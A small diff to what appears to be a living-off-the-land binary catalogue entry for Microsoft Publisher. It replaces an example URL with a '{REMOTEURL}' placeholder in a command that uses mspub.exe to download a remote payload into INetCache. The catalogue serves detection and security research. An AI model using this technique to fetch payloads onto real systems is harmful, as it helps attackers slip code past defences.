@@ -4,7 +4,7 @@ Description: Microsoft Publisher
 Author: Nir Chako
 Created: 2022-08-02
 Commands:
-  - Command: mspub.exe https://example.com/payload
+  - Command: mspub.exe {REMOTEURL}
     Description: Downloads payload from remote server
     Usecase: It will download a remote payload and place it in INetCache.
     Category: Download
